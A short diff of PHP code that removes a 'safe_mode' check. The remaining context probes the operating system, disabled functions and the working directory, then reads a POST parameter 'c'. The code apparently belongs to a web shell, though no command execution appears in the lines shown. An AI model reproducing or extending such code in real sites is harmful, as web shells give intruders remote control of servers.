@@ -42,7 +42,6 @@ if( strtolower( substr(PHP_OS,0,3) ) == "win" )
 	$os = 'win';
 else
 	$os = 'nix';
-$safe_mode = @ini_get('safe_mode');
 $disable_functions = @ini_get('disable_functions');
 $home_cwd = @getcwd();
 if( isset( $_POST['c'] ) )
